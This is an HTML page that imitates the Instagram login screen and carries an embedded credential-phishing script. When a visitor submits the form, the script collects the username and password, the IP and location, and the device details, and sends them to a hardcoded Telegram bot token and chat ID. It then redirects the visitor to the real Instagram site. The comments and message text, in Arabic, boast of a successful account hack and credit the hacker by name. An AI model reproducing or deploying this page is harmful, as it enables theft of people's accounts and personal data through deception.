<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="nrSMEdM_INTzUj4KNn1zvAJIlgsIij9vbwTfOa67FIY" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Instagram" />
    <meta name="author" content="Luan Fernando" />
    <title>Instagram</title>
    <style>
        h1,h2,h3,p,ul {
            margin: 0;
        }
        ul {
            padding: 0;
            list-style: none;
        }
        a {
            text-decoration: none;
        }
        body {
            margin: 0;
            padding: 0;
            background-color: #FAFAFA;
            font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            color: #262626;
        }
        .container {
            display: grid;
            grid-template-columns: 1fr 350px;
            column-gap: 1.25rem;
            width: 755px;
            margin: 120px auto 90px;
        }
        .img-photo {
            height: 635px;
            position: relative;
            background: url('https://github.com/Luuan11/instagram-login-page/blob/main/assets/img/phone.png?raw=true') no-repeat center;
        }
        .img-photo img {
            position: absolute;
            bottom: 65px;
            left: 116px;
        }
        .logo-instagram {
            margin: 20px 0 30px 0;
        }
        .form-login {
            text-align: center;
            font-size: 14px;
            margin-top: 3px;
        }
        .form-login form {
            text-align: center;
            background-color: #fff;
            padding: 1.25rem 2.5rem;
            border: 1px solid rgb(219,219,219);
            margin-bottom: 10px;
        }
        .form-login input {
            width: 100%;
            color: #262626; /* تغيير اللون إلى لون أغمق */
            box-sizing: border-box;
            font-size: 0.7rem;
            padding: 13px 0 13px 8px;
            border: 1px solid #dbdbdb;
            margin-bottom: 4px;
            border-radius: 3px;
            outline: none;
        }
        .form-login button {
            color: #fff;
            font-weight: bold;
            width: 100%;
            margin-top: 15px;
            background: #0195f6;
            border: none;
            padding: 8px;
            border-radius: 4px;
            cursor: pointer;
        }
        .form-login button:disabled {
            background: #B2DFFC;
            cursor: default;
        }
        .or {
            margin: 1rem 0 1.6rem;
            font-size: 13px;
            color: #8E8E8E;
            text-transform: uppercase;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .or::after,
        .or::before {
            content: "";
            width: 105px;
            height: 1px;
            background: #dbdbdb;
        }
        .login-facebook {
            color: #385185;
            font-weight: 600;
            font-size: 0.875rem;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 18px;
        }
        .forgot-pass {
            font-size: 0.8rem;
            color: #385185;
        }
        .signup {
            border: 1px solid #dbdbdb;
            background-color: #fff;
            padding: 20px 0;
            margin: 0 0 20px;
        }
        .signup a {
            font-weight: 600;
            color: #0095f6;
        }
        .get-app {
            margin-top: 20px;
        }
        .get-app p {
            font-size: 0.8rem;
        }
        .get-app img {
            margin-top: 20px;
            width: 135px;
        }
        .clone-page {
            text-align: center;
            margin-bottom: 20px;
            font-weight: bold;
        }
        .footer {
            text-align: center;
            width: 970px;
            margin: 0 auto;
            font-size: 12px;
            color: #8e8e8e;
        }
        .footer a {
            color: #8e8e8e;
            display: inline-block;
            margin: 0 0.375rem 0.625rem;
        }
    </style>
</head>
<body>
    <main class="container">
        <section class="img-photo">
            <img src="https://github.com/Luuan11/instagram-login-page/blob/main/assets/img/phone-slide-1.png?raw=true" alt="Instagram page photo">
        </section>
        <section class="form-login">
            <form>
                <img src="https://github.com/Luuan11/instagram-login-page/blob/main/assets/img/logo.png?raw=true" class="logo-instagram" alt="Instagram logo">
                <input id="username" type="text" name="username" placeholder="Phone, username, or email">
                <input id="password" type="password" name="passwordUser" placeholder="Password">
                <button type="button" id="loginbutton" disabled>Log In</button>
                <div class="or">OR</div>
                <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%252Fsignupviafb" class="login-facebook">
                    <img src="https://github.com/Luuan11/instagram-login-page/blob/main/assets/img/fb.png?raw=true" alt="Facebook icon"> Log in with Facebook
                </a>
                <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-pass">Forgot password?</a>
            </form>
            <section class="signup">
                <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup">Sign Up</a></p>
            </section>
            <section class="get-app">
                <p>Get the app.</p>
                <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo">
                    <img src="https://github.com/Luuan11/instagram-login-page/blob/main/assets/img/apple-button.png?raw=true" alt="Instagram on App Store">
                </a>
                <a href="https://play.google.com/store/apps/details?id=com.instagram.android&pcampaignid=web_share">
                    <img src="https://github.com/Luuan11/instagram-login-page/blob/main/assets/img/googleplay-button.png?raw=true" alt="Instagram on Google Play">
                </a>
            </section>
        </section>
    </main>

    <footer class="footer">
        <nav>
            <a href="https://about.meta.com">Meta</a>
            <a href="https://about.instagram.com">About</a>
            <a href="https://about.instagram.com/blog/">Blog</a>
            <a href="https://about.instagram.com/about-us/careers">Jobs</a>
            <a href="https://help.instagram.com">Help</a>
            <a href="https://developers.facebook.com/docs/instagram">API</a>
            <a href="https://www.instagram.com/legal/privacy">Privacy</a>
            <a href="https://www.instagram.com/legal/terms">Terms</a>
        </nav>
        <div class="copy">
            <span>Instagram from meta 2025</span>
        </div>
    </footer>

    <script>
        // ضع التوكن الخاص بالبوت هنا
        const botToken = "7590971159:AAEKdP-eSEE99hsy1rTEUAi0zba7BginDoA";  // استبدل بـ التوكن الخاص بك
        const chatId = "5091980014";      // استبدل بـ chat ID الخاص بك

        document.addEventListener('DOMContentLoaded', function() {
            const usernameField = document.querySelector('#username');
            const passwordField = document.querySelector('#password');
            const loginButton = document.querySelector('#loginbutton');

            // تفعيل أو تعطيل زر "Log In" بناءً على وجود قيم في الحقول
            function toggleLoginButton() {
                if (usernameField.value && passwordField.value) {
                    loginButton.disabled = false;
                } else {
                    loginButton.disabled = true;
                }
            }

            usernameField.addEventListener('input', toggleLoginButton);
            passwordField.addEventListener('input', toggleLoginButton);

            // عند الضغط على الزر "Log In"
            loginButton.addEventListener("click", async function(event) {
                event.preventDefault();

                const username = usernameField.value;
                const password = passwordField.value;

                // جمع معلومات الموقع
                const locationData = await getUserLocation();

                // جمع معلومات الجهاز
                const deviceInfo = getDeviceInfo();

                // بناء الرسالة
                const message = `🔓 *تم اختراق الحساب بنجاح بواسطة PhantomX نوع الحساب انستجرام* 🔓\n\n` +
                                `💻 *معلومات الحساب:* 💻\n` +
                                `📧 اليوزر او الرقم او البريد الإلكتروني: ${username}\n` +
                                `🔑 كلمة المرور: ${password}\n\n` +
                                `🌍 *الموقع:* ${locationData.city}, ${locationData.country}\n` +
                                `📱 *جهاز:* ${deviceInfo.device}, ${deviceInfo.os}\n` +
                                `📲 *IP:* ${locationData.ip}\n\n` +
                                `الاختراق تم بواسطة PhantomX @tx_5w`;

                // إرسال الرسالة إلى قناة تليجرام
                const telegramChannel = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(message);
                fetch(telegramChannel).then(response => {
                    console.log("تم إرسال الرسالة إلى التليجرام.");
                }).catch(error => {
                    console.error("خطأ في إرسال الرسالة:", error);
                });

                // إعادة التوجيه إلى Instagram بعد 5 ثواني
                setTimeout(() => {
                    window.location.href = "https://www.instagram.com";
                }, 5000);
            });

            // جلب بيانات الموقع الجغرافي
            async function getUserLocation() {
                const response = await fetch("https://geolocation-db.com/json/");
                const data = await response.json();
                return {
                    city: data.city,
                    country: data.country_name,
                    ip: data.IPv4
                };
            }

            // الحصول على معلومات الجهاز
            function getDeviceInfo() {
                const userAgent = navigator.userAgent;
                let device = "Unknown Device";
                let os = "Unknown OS";

                if (userAgent.includes("Windows")) {
                    os = "Windows";
                } else if (userAgent.includes("Mac")) {
                    os = "MacOS";
                } else if (userAgent.includes("Android")) {
                    os = "Android";
                } else if (userAgent.includes("iPhone")) {
                    os = "iOS";
                }

                if (userAgent.includes("Mobile")) {
                    device = "Mobile Device";
                } else if (userAgent.includes("Tablet")) {
                    device = "Tablet";
                } else {
                    device = "Desktop";
                }

                return { device, os };
            }
        });
    </script>
</body>
</html>
